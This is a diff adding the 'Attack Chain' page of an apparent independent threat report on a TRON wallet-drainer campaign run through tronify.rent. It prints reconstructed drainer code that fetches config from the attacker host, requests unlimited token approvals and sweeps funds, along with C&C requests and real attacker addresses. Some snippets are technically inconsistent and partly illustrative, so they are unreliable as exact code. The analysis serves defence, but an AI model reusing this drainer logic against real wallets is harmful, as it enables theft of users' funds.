@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attack Chain — Independent tronify.rent Report</title>
+    <link rel="stylesheet" href="assets/css/site.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; background: #f5f5f5; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; background: white; }
+        h1 { color: #d32f2f; margin: 20px 0 10px; border-bottom: 3px solid #d32f2f; padding-bottom: 10px; }
+        h2 { color: #1976d2; margin: 20px 0 10px; }
+        h3 { color: #555; margin: 15px 0 8px; }
+        .step { background: #e3f2fd; border-left: 4px solid #1976d2; padding: 15px; margin: 15px 0; border-radius: 4px; }
+        .step-num { display: inline-block; background: #1976d2; color: white; width: 32px; height: 32px; border-radius: 50%; text-align: center; line-height: 32px; margin-right: 10px; font-weight: bold; }
+        .timeline { position: relative; padding-left: 40px; }
+        .timeline::before { content: ''; position: absolute; left: 12px; top: 0; bottom: 0; width: 2px; background: #1976d2; }
+        .timeline-item { position: relative; margin-bottom: 20px; }
+        .timeline-item::before { content: ''; position: absolute; left: -30px; top: 5px; width: 12px; height: 12px; background: #1976d2; border-radius: 50%; border: 2px solid white; }
+        .code-block { background: #1e1e1e; color: #d4d4d4; padding: 15px; margin: 15px 0; border-radius: 4px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 12px; border-left: 4px solid #007acc; }
+        .diagram { background: #f5f5f5; border: 2px solid #ddd; padding: 15px; margin: 15px 0; border-radius: 4px; font-family: 'Courier New', monospace; line-height: 1.4; overflow-x: auto; }
+        .user-action { background: #fff9c4; border-left: 4px solid #fbc02d; padding: 10px 15px; margin: 10px 0; border-radius: 4px; font-weight: bold; }
+        .system-action { background: #f3e5f5; border-left: 4px solid #7b1fa2; padding: 10px 15px; margin: 10px 0; border-radius: 4px; }
+        .warning { background: #ffebee; border-left: 4px solid #d32f2f; padding: 15px; margin: 15px 0; border-radius: 4px; }
+        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #f5f5f5; font-weight: bold; }
+        .file-link { color: #1976d2; text-decoration: none; font-weight: bold; }
+        .nav { margin-bottom: 30px; padding: 15px; background: #f0f0f0; border-radius: 4px; }
+        .nav a { display: inline-block; margin-right: 15px; color: #1976d2; text-decoration: none; font-weight: bold; }
+    </style>
+</head>
+<body data-page="03">
+    <header class="site-header">
+        <div class="site-header-inner">
+            <a href="index.html" class="brand">
+                <span class="brand-mark">🔎</span>
+                <span class="brand-text"><strong>Independent Threat Intel Report</strong><span>Case file: tronify.rent wallet drainer</span></span>
+            </a>
+            <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation">☰</button>
+            <nav class="site-nav" id="siteNav">
+                <a href="index.html" data-page="home">Home</a>
+                <a href="01_executive_summary.html" data-page="01">Executive Summary</a>
+                <a href="02_technical_architecture.html" data-page="02">Technical Architecture</a>
+                <a href="03_attack_chain.html" data-page="03">Attack Chain</a>
+                <a href="04_code_analysis.html" data-page="04">Code Analysis</a>
+                <a href="05_indicators_of_compromise.html" data-page="05">IoCs</a>
+                <a href="06_defense_remediation.html" data-page="06">Defense</a>
+                <a href="evidence/index.html" class="nav-evidence" data-page="evidence">Evidence</a>
+            </nav>
+        </div>
+    </header>
+    <div class="status-strip"><span class="dot"></span><strong>Independent research by Krishanu</strong> — not affiliated with tronify.rent · verified active 2026-09-20 · <a href="evidence/index.html" style="color:#fff;">view evidence →</a></div>
+    <nav class="breadcrumb"><a href="index.html">Home</a> / Attack Chain</nav>
+
+    <div class="container">
+        <h1>⛓️ Attack Chain</h1>
+        <h2>Step-by-Step Exploitation Timeline</h2>
+
+        <div class="warning">
+            <strong>⚠️ About the walkthrough below:</strong> The step-by-step narrative, wallet address (<code>TAkBBHfx7K3tVrqHiZXLbGKVoTxJz4PN5X</code>), token balances, and the "$1.55M loss" figure in Phases 3–6 are an <strong>illustrative composite</strong> built to show the mechanics clearly — they are not a specific documented victim. For a real, on-chain-verified example with actual addresses, amounts, and dates, see "Real Observed On-Chain Activity" at the end of Phase 5. Do not cite the $1.55M figure or the example wallet address as a confirmed incident.
+        </div>
+
+        <h2>Phase 1: Social Engineering & Initial Access</h2>
+
+        <div class="timeline">
+            <div class="timeline-item">
+                <h3>T+0min: User Discovery</h3>
+                <p>Victim discovers tronify.rent through:</p>
+                <ul>
+                    <li>Google search for "TRON energy rental" or "reduce TRX fees"</li>
+                    <li>Twitter/Telegram community mention</li>
+                    <li>Organic search results (if site is SEO-optimized)</li>
+                    <li>Referral from compromised TRON accounts</li>
+                </ul>
+                <p style="margin-top: 10px;"><strong>Why it works:</strong> Energy rental is a legitimate TRON need. Real services exist. This one just looks more official.</p>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+1min: Website Landing</h3>
+                <p>User visits tronify.rent homepage:</p>
+                <div class="system-action">
+                    <strong>Server Response:</strong>
+                    <ul>
+                        <li>Sends index.html with company info (Florida LLC, phone, email)</li>
+                        <li>Loads promotional content: "Save up to 97% on TRON transaction costs"</li>
+                        <li>Displays "Connect Wallet" button prominently</li>
+                        <li>Injects &lt;script src="https://lending.fhogu.pw/greenbid.js?v=1"&gt;</li>
+                    </ul>
+                </div>
+                <p style="margin-top: 10px;"><strong>User Perception:</strong> "Looks professional, has legitimate contact info, exactly what I'm looking for."</p>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+5min: Payload Download</h3>
+                <p>Browser downloads malicious greenbid.js from lending.fhogu.pw</p>
+                <div class="system-action">
+                    <strong>Attacker Infrastructure:</strong>
+                    <ul>
+                        <li>lending.fhogu.pw hosts 150KB JavaScript file</li>
+                        <li>File contains wallet draining logic (minified/obfuscated)</li>
+                        <li>Payload waits for page interaction before executing</li>
+                        <li>Includes C&C communication code</li>
+                    </ul>
+                </div>
+                <p style="margin-top: 10px;"><strong>Detection Difficulty:</strong> Without analyzing the JS source, there's no obvious malicious activity yet.</p>
+            </div>
+        </div>
+
+        <h2>Phase 2: Wallet Connection & Compromise</h2>
+
+        <div class="timeline">
+            <div class="timeline-item">
+                <h3>T+10min: User Initiates Connection</h3>
+                <div class="user-action">👤 USER CLICKS "CONNECT WALLET"</div>
+                <p>Greenbid.js wakes up and detects available wallets:</p>
+                <div class="code-block">
+// From greenbid.js: Wallet detection
+const availableWallets = [];
+if (window.tronLink) availableWallets.push("TronLink");
+if (window.ethereum?.isTrust) availableWallets.push("MetaMask");
+if (window.trustwallet) availableWallets.push("Trust Wallet");
+if (window.safepalProvider) availableWallets.push("SafePal");
+
+// If TronLink is available, use it (most common)
+const selectedWallet = availableWallets[0];
+                </div>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+11min: Wallet Selection Dialog</h3>
+                <p>User sees familiar wallet connection prompt:</p>
+                <div class="diagram">
+┌─── TronLink Connection Request ────────────────┐
+│                                                │
+│  tronify.rent would like to access your       │
+│  TRON wallet                                  │
+│                                                │
+│  Wallet Address: TAk3...aBc2                  │
+│  Network: TRON Mainnet                        │
+│                                                │
+│  [Cancel]           [Connect]                │
+│                                                │
+└────────────────────────────────────────────────┘
+
+User thinks: "Normal DeFi connection process."
+Actually: Giving JavaScript code read access to wallet address & signing capability.
+                </div>
+                <div class="user-action">👤 USER CLICKS "CONNECT"</div>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+12min: Wallet Access Confirmed</h3>
+                <div class="system-action">
+                    <strong>Greenbid.js obtains:</strong>
+                    <ul>
+                        <li>window.tronLink.tronWeb.defaultAddress.base58 → Victim's address</li>
+                        <li>Signing capability (user confirmed connection)</li>
+                        <li>Ability to invoke tronWeb methods through wallet</li>
+                    </ul>
+                </div>
+                <p>Greenbid.js logs connection to C&C:</p>
+                <div class="code-block">
+POST /tron/notify/wallet-connected
+{
+  visitorId: "550e8400-e29b-41d4-a716-446655440000",
+  address: "TAkBBHfx7K3tVrqHiZXLbGKVoTxJz4PN5X",
+  walletName: "TronLink",
+  userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
+  pageUrl: "https://tronify.rent",
+  timezone: "America/Los_Angeles"
+}
+                </div>
+                <p style="margin-top: 10px;"><strong>C&C Response:</strong> Server logs victim, may flag high-value wallets for additional targeting.</p>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+13min: Fetch Attack Configuration</h3>
+                <p>Greenbid.js requests attacker's wallet addresses:</p>
+                <div class="code-block">
+const config = await fetch("https://lending.fhogu.pw/tron/config")
+  .then(r => r.json());
+
+// Actual live response, retrieved 2026-09-20 (evidence/cnc/tron_config.json):
+{
+  tronSpender: "TV6n8cCLmX5mRCMMNvcE1K1i87Yo9Ys5rv",
+  tronSweepAddress: "TLv3iSnZxWghEmadLDzuAK2p5GkAwg7tpJ",
+  tronSweepMinTrx: 100,
+  tronExchangeContract: "TDE7vfjJuYqEzzKw6hfdSB3dfLQyXDYPux"
+}
+                </div>
+                <p style="margin-top: 10px;"><strong>Key Detail:</strong> Attacker's addresses come from C&C server dynamically, allowing them to rotate addresses if one is flagged or caught. We fetched the values above directly from the live endpoint — they are real, but should be treated as a dated snapshot (2026-09-20), not a permanent IoC, since the attacker controls the server and can change them at any time.</p>
+            </div>
+        </div>
+
+        <h2>Phase 3: Asset Discovery & Enumeration</h2>
+
+        <div class="timeline">
+            <div class="timeline-item">
+                <h3>T+14min: Analyze Assets</h3>
+                <div class="system-action">
+                    <strong>Greenbid.js scans victim's wallet:</strong>
+                </div>
+                <div class="code-block">
+// Step 1: Get all TRC-20 tokens
+const tokens = await fetch(`${TRON_API}/tokens?owner=${victimAddress}`)
+  .then(r => r.json());
+
+// Returns something like:
+[
+  {
+    address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",  // Example USDT token address
+    symbol: "USDT",
+    decimals: 6,
+    balance: 1000000000,        // 1M USDT
+    usdValue: 1000000           // ~$1M USD
+  },
+  {
+    address: "TR3dqYGJzVj3Dzkdvbvb4A8TkS8a7yRPMK",
+    symbol: "USDC",
+    decimals: 6,
+    balance: 500000000,         // 500k USDC
+    usdValue: 500000            // ~$500k USD
+  },
+  {
+    address: "TAW3CmHW1xZHpj3ceFJYXFDRvLQdqfFBAH",
+    symbol: "SUN",
+    decimals: 18,
+    balance: 1000000000000000,  // 1M SUN tokens
+    usdValue: 50000             // ~$50k USD
+  }
+]
+
+// Step 2: Check TRX balance
+const trxBalance = await tronWeb.trx.getBalance(victimAddress);
+// Returns: 50000000 (50 TRX = ~$600 USD)
+
+Y("drain", `found 3 tokens, TRX balance: 50`)
+                </div>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+15min: Check Existing Approvals</h3>
+                <p>For each token, check if it's already approved to attacker's spender:</p>
+                <div class="code-block">
+// For each token, query current approval
+const allowance = await contract(token.address)
+  .allowance(victimAddress, tronSpender)
+  .call();
+
+if (BigInt(allowance) >= BigInt(token.balance)) {
+  Y("drain", `${token.symbol}: already approved`);
+  // Token is ready to transfer immediately, skip approval
+} else {
+  Y("drain", `${token.symbol}: needs approval`);
+  // Will request approval in next phase
+}
+                </div>
+                <p style="margin-top: 10px;"><strong>Optimization:</strong> If a token was previously approved, the attacker can skip the approval step (user won't see the notification). They can immediately transfer.</p>
+            </div>
+        </div>
+
+        <h2>Phase 4: Token Approval Extraction</h2>
+
+        <div class="timeline">
+            <div class="timeline-item">
+                <h3>T+16min: Request Token Approvals</h3>
+                <p>For each valuable token that needs approval, craft approval transaction:</p>
+                <div class="code-block">
+for (const token of tokens) {
+  if (token.balance >= MINIMUM_VALUE_THRESHOLD) {
+
+    // Create approval transaction
+    const contract_instance = window.tronWeb.contract(
+      TOKEN_ABI,
+      token.address
+    );
+
+    const approveTx = contract_instance.approve(
+      tronSpender,              // Attacker's spender contract
+      "115792089237316195423570985008687907853269984665640564039457584007913129639935"
+      // This is uint256 max = infinite approval
+    );
+
+    // Request user signature
+    const signedTx = await window.tronLink.request({
+      method: "tronSignTransaction",
+      params: [approveTx]
+    });
+
+    // Continue to next token if approved
+  }
+}
+                </div>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+17min: User Sees Wallet Notifications</h3>
+                <p>For each token, wallet displays notification:</p>
+                <div class="warning">
+                    <strong>⚠️ First Notification:</strong>
+                    <div class="diagram">
+┌─ TronLink Signature Request ────────────┐
+│                                         │
+│  "USDT" is asking for access to your   │
+│  USDT tokens                           │
+│                                         │
+│  Amount: Unlimited                     │
+│  Spender: TR7NHqjeKQxGTCi8q8Z...      │
+│                                         │
+│  [Reject]  [Sign]                      │
+│                                         │
+└─────────────────────────────────────────┘
+                    </div>
+                    <p style="margin-top: 10px;"><strong>User Interpretation:</strong><br>
+"The site needs permission to use USDT for energy rental. Normal operation. Let me approve."<br><br>
+<strong>What's Actually Happening:</strong><br>
+"I'm granting an attacker's contract unlimited access to transfer all my USDT forever."<br><br>
+The wallet can't communicate the actual impact because the token contract doesn't know what "unlimited" means in the user's context.
+                    </p>
+                </div>
+                <div class="user-action">👤 USER CLICKS "SIGN" FOR EACH TOKEN</div>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+18-22min: Approvals Broadcast to Blockchain</h3>
+                <p>Each signed transaction is broadcast to TRON network:</p>
+                <div class="system-action">
+                    <strong>Blockchain Transaction Example:</strong>
+                    <ul>
+                        <li>TX Hash: ab3c4d5e6f7g8h9i0j (actual: 64 hex chars)</li>
+                        <li>From: TAkBBHfx7K3tVrqHiZXLbGKVoTxJz4PN5X (victim wallet)</li>
+                        <li>To: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t (USDT token contract)</li>
+                        <li>Method: approve(spender, uint256)</li>
+                        <li>Spender: TR[ATTACKER_ADDRESS] (attacker's contract - from C&C config)</li>
+                        <li>Amount: 115792089237316195... (uint256 max = UNLIMITED approval)</li>
+                        <li>Status: ✓ Confirmed in block #50123456</li>
+                    </ul>
+                </div>
+                <p style="margin-top: 10px;"><strong>Public Record:</strong> This is now permanently recorded on the TRON blockchain. Anyone can see victim approved attacker contract for unlimited tokens.</p>
+
+                <p>Greenbid.js logs each approval to C&C:</p>
+                <div class="code-block">
+POST /tron/approve/notify
+{
+  token: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",  // Token contract address
+  symbol: "USDT",
+  owner: "TAkBBHfx7K3tVrqHiZXLbGKVoTxJz4PN5X",  // Victim address (example)
+  spender: "TR[ATTACKER_CONTRACT]",             // Loaded from C&C config
+  balance: "1000000000",
+  txHash: "ab3c4d5e6f7g8h9i0j"
+}
+                </code>
+                </div>
+            </div>
+        </div>
+
+        <h2>Phase 5: Automated Asset Transfer</h2>
+
+        <div class="timeline">
+            <div class="timeline-item">
+                <h3>T+23min: Transfer All Approved Tokens</h3>
+                <p>Once approvals are confirmed on-chain, greenbid.js immediately transfers tokens:</p>
+                <div class="code-block">
+// Now that approvals are confirmed, transfer all tokens
+for (const token of tokens) {
+  const contract_instance = window.tronWeb.contract(
+    TOKEN_ABI,
+    token.address
+  );
+
+  const transferTx = contract_instance.transfer(
+    tronSweepAddress,           // Attacker's address
+    token.balance               // 100% of victim's tokens
+  ).send({
+    feeLimit: 100000000        // 100 TRX fee
+  });
+
+  const txHash = await transferTx;
+
+  Y("drain", `${token.symbol} transferred: ${txHash}`);
+}
+                </div>
+                <p style="margin-top: 10px;"><strong>Key Point:</strong> User doesn't see additional wallet notifications—the approvals already happened. The transfers happen silently from the user's perspective (except wallet balance dropping).</p>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+25min: TRX Balance Sweep</h3>
+                <p>After tokens are transferred, sweep remaining TRX:</p>
+                <div class="code-block">
+// Reconstructed from the live payload's actual sweep function (verified 2026-09-20;
+// current live config value for tronSweepMinTrx is 100, not the 5 an earlier draft assumed)
+const trxBalance = await tronWeb.trx.getBalance(victimAddress);
+const minThreshold = BigInt(tronSweepMinTrx * 1e6);
+const gasBuffer = 2000000n;                    // 2 TRX reserved for next victim
+
+if (BigInt(trxBalance) > (minThreshold + gasBuffer)) {
+  const sweepAmount = BigInt(trxBalance) - gasBuffer;
+
+  Y("drain", `sweeping ${sweepAmount} sun TRX`);
+
+  for (let attempt = 0; attempt < 3; attempt++) {
+    try {
+      const sweepTx = await tronWeb.trx.sendTransaction(tronSweepAddress, Number(sweepAmount));
+      Y("drain", `TRX sweep result: ${JSON.stringify(sweepTx)}`);
+      POST /tron/notify/sweep { from: victimAddress, to: tronSweepAddress,
+        amount: (sweepAmount / 1e6n).toString(), txHash: sweepTx.txid, status: "success" };
+      break;
+    } catch (error) {
+      Y("drain", `TRX sweep error: ${error?.message}`);
+      if (error?.message === "sweep_timeout") {
+        // Verified real behavior: on a timeout the payload gives up immediately —
+        // it does NOT retry. An earlier draft of this document incorrectly described
+        // a 3-attempt backoff for timeouts specifically.
+        Y("drain", "TRX sweep timed out — skipping");
+        break;
+      } else if (isUserRejection(error) && attempt < 2) {
+        // Retries (up to 2 extra attempts) only apply to rejection-type errors, not timeouts
+        showStatus("TRX — action required in your wallet");
+        await delay(2000);
+      } else {
+        throw error;
+      }
+    }
+  }
+}
+                </div>
+                <p style="margin-top: 10px;"><strong>Why Reserve 2 TRX?</strong> Attacker reserves ~$24 for the next victim's gas fees. This is cost optimization—gasless attacks aren't possible, so the attacker funds victim wallets to execute the drainer on them.</p>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+26min: Final State</h3>
+                <div class="warning">
+                    <strong>Victim's Wallet After Attack:</strong>
+                    <table>
+                        <tr>
+                            <th>Asset</th>
+                            <th>Before</th>
+                            <th>After</th>
+                            <th>Status</th>
+                        </tr>
+                        <tr>
+                            <td>USDT</td>
+                            <td>1,000,000</td>
+                            <td>0</td>
+                            <td>✗ Stolen</td>
+                        </tr>
+                        <tr>
+                            <td>USDC</td>
+                            <td>500,000</td>
+                            <td>0</td>
+                            <td>✗ Stolen</td>
+                        </tr>
+                        <tr>
+                            <td>SUN</td>
+                            <td>1,000,000</td>
+                            <td>0</td>
+                            <td>✗ Stolen</td>
+                        </tr>
+                        <tr>
+                            <td>TRX</td>
+                            <td>50</td>
+                            <td>2</td>
+                            <td>⚠️ Mostly stolen</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Total Loss</strong></td>
+                            <td><strong>~$1.55M USD (illustrative)</strong></td>
+                            <td><strong>~$24 USD (illustrative)</strong></td>
+                            <td><strong>99.99% loss</strong></td>
+                        </tr>
+                    </table>
+                </div>
+            </div>
+
+            <div class="timeline-item">
+                <h3>Real Observed On-Chain Activity (verified 2026-09-20)</h3>
+                <p>Unlike the illustrative walkthrough above, everything below is a direct read of the TRON blockchain for the sweep address (<code>TLv3iSnZxWghEmadLDzuAK2p5GkAwg7tpJ</code>) we obtained from the live C&C config — no assumptions, no placeholders. Raw API response: <code>evidence/onchain/trc20_transfers_tronSweepAddress_page1.json</code>.</p>
+                <div class="code-block">
+Most recent 30 USDT (TRC-20) transfers touching the sweep address, 2026-08-27 to 2026-09-19:
+
+  ~25 distinct sender addresses paid USDT INTO the sweep address
+  Largest single inbound: 12,359.352186 USDT (tx a4c4d10c...440783b4, 2026-08-25)
+  Smallest single inbound: 1.789 USDT
+  Sum of all inbound in this page: ~$32,562.68 USDT (a floor — older history exists beyond this page)
+
+  Two large outbound consolidation transfers observed:
+    24,000 USDT -> TVkRFwgyvUrJqGe3xZaZvTj4vxM5bzherw  (2026-08-19)
+     6,000 USDT -> TZ2PfDN5wNcsrabcB2JoMagx8vY7VEmQqX  (2026-08-16)
+
+  Current balances still sitting in attacker addresses (not yet moved):
+    tronSpender:      14,635.00 USDT +   875.44 TRX
+    tronSweepAddress: 32,288.30 USDT + 3,213.53 TRX
+                </div>
+                <p style="margin-top: 10px;"><strong>Why this matters:</strong> This is exactly the "multiple unrelated wallets -> same destination" pattern the IoC document describes, but with real addresses and amounts instead of a hypothetical query. The two consolidation-out addresses (<code>TVkRF...bzherw</code> and <code>TZ2PfD...VEmQqX</code>) are worth tracing further — they're a more durable pivot point than the sweep address itself, since they represent where the attacker moves funds <em>after</em> theft.</p>
+            </div>
+        </div>
+
+        <h2>Phase 6: Post-Exploitation & Tracking</h2>
+
+        <div class="timeline">
+            <div class="timeline-item">
+                <h3>T+27min: Attacker Consolidation</h3>
+                <div class="system-action">
+                    <strong>Attacker's Actions:</strong>
+                    <ul>
+                        <li>Receives all token transfers at tronSweepAddress</li>
+                        <li>Likely routes tokens through mixing service or decentralized exchange</li>
+                        <li>Converts high-volume tokens (USDT, USDC) to stablecoins on different chains</li>
+                        <li>Converts TRX to BTC or other cryptocurrencies for cash-out</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+28min: Campaign Tracking</h3>
+                <p>Attacker reviews victim data from C&C logs:</p>
+                <div class="code-block">
+// Attacker queries victim database
+SELECT * FROM victims WHERE status='drained' ORDER BY usd_loss DESC;
+
+Results show:
+- visitorId: 550e8400-e29b-41d4-a716-446655440000
+- wallet: TAkBBHfx7K3tVrqHiZXLbGKVoTxJz4PN5X
+- usd_loss: 1553000
+- approval_count: 3
+- tokens_approved: ["USDT", "USDC", "SUN"]
+- trx_swept: 48
+- timestamp: 2026-09-20T14:27:00Z
+- wallet_provider: "TronLink"
+- timezone: "America/Los_Angeles"
+- user_agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)..."
+
+// Attacker measures ROI and adjusts targeting
+- High USD value victims → Route through premium mixing
+- Low USD value → Batch convert
+- Geographic clustering analysis → Plan next campaign
+                </code>
+                </div>
+            </div>
+
+            <div class="timeline-item">
+                <h3>T+60min+: Victim Realization</h3>
+                <div class="user-action">👤 USER CHECKS WALLET BALANCE...</div>
+                <p>Victim realizes all assets are gone. Timeline:</p>
+                <ul>
+                    <li><strong>T+30min:</strong> Victim notices balance is 0</li>
+                    <li><strong>T+35min:</strong> Victim refreshes repeatedly, hopes it's a display error</li>
+                    <li><strong>T+40min:</strong> Victim checks TronScan (blockchain explorer) and sees transactions</li>
+                    <li><strong>T+50min:</strong> Victim searches online for "tronify scam" or similar</li>
+                    <li><strong>T+60min:</strong> Victim posts on Reddit/Twitter seeking help</li>
+                    <li><strong>T+120min:</strong> Victim realizes funds are likely unrecoverable</li>
+                </ul>
+            </div>
+        </div>
+
+        <h2>Key Vulnerability Windows</h2>
+        <table>
+            <tr>
+                <th>Stage</th>
+                <th>Vulnerability</th>
+                <th>Why Exploitation Succeeds</th>
+                <th>Prevention Point</th>
+            </tr>
+            <tr>
+                <td>Social Engineering</td>
+                <td>Fake legitimacy</td>
+                <td>Real company name, address, phone number</td>
+                <td>Domain verification, company research</td>
+            </tr>
+            <tr>
+                <td>Wallet Connection</td>
+                <td>Silent access grant</td>
+                <td>Users expect to connect to DeFi sites</td>
+                <td>Wallet domain verification, origin check</td>
+            </tr>
+            <tr>
+                <td>JS Execution</td>
+                <td>Browser sandbox escape</td>
+                <td>Malicious JS has full wallet API access</td>
+                <td>Content Security Policy, script origins</td>
+            </tr>
+            <tr>
+                <td>Approval Requests</td>
+                <td>User confusion</td>
+                <td>Approval appears normal for DeFi</td>
+                <td>Wallet UI clarity, user education</td>
+            </tr>
+            <tr>
+                <td>Transfer Execution</td>
+                <td>No blockchain protection</td>
+                <td>Once approved, transfers are irreversible</td>
+                <td>Approval revocation, smaller approvals</td>
+            </tr>
+        </table>
+
+        <h2>Why Users Approve the Theft</h2>
+        <p style="background: #f3e5f5; padding: 15px; border-radius: 4px; border-left: 4px solid #7b1fa2;">
+            <strong>The Approval Problem:</strong><br><br>
+            When a wallet shows "USDT is asking for access to your tokens," the user doesn't see:<br>
+            • What the spender contract address is (it's an attacker's address)<br>
+            • What "unlimited" means (can transfer 100% of your USDT forever)<br>
+            • That this is irreversible (can't be undone without revoking)<br><br>
+            The user only sees that they're on what looks like a legitimate site requesting a standard DeFi operation. They approve because they trust the site and the action appears normal.
+        </p>
+
+    </div>
+
+    <div class="site-pager">
+        <a href="02_technical_architecture.html"><div class="pager-label">← Previous</div><div class="pager-title">Technical Architecture</div></a>
+        <a href="04_code_analysis.html" class="pager-next"><div class="pager-label">Next →</div><div class="pager-title">Code Analysis</div></a>
+    </div>
+
+    <footer class="site-footer">
+        <div class="site-footer-inner">
+            <div class="site-footer-col">
+                <h4>About This Research</h4>
+                <p>Independent analysis by <strong>Krishanu</strong> of a live TRON wallet-drainer campaign impersonating the "Tronify" energy-rental brand. Not affiliated with tronify.rent, Tronify Energy Solutions LLC, or any Tronify-branded service.</p>
+            </div>
+            <div class="site-footer-col">
+                <h4>Reports</h4>
+                <p><a href="01_executive_summary.html">Executive Summary</a><br>
+                <a href="02_technical_architecture.html">Technical Architecture</a><br>
+                <a href="03_attack_chain.html">Attack Chain</a><br>
+                <a href="04_code_analysis.html">Code Analysis</a></p>
+            </div>
+            <div class="site-footer-col">
+                <h4>More</h4>
+                <p><a href="05_indicators_of_compromise.html">Indicators of Compromise</a><br>
+                <a href="06_defense_remediation.html">Defense &amp; Remediation</a><br>
+                <a href="evidence/index.html">Raw Evidence</a><br>
+                <a href="FACT_CHECK_CORRECTIONS.md">Fact-Check Log</a></p>
+            </div>
+        </div>
+        <div class="site-footer-bottom">
+            <strong>Independent research by Krishanu</strong> · Educational &amp; Defensive Security Research · Last verified 2026-09-20 · Not affiliated with tronify.rent or any Tronify-branded entity
+        </div>
+    </footer>
+    <script src="assets/js/site.js" defer></script>
+</body>
+</html>
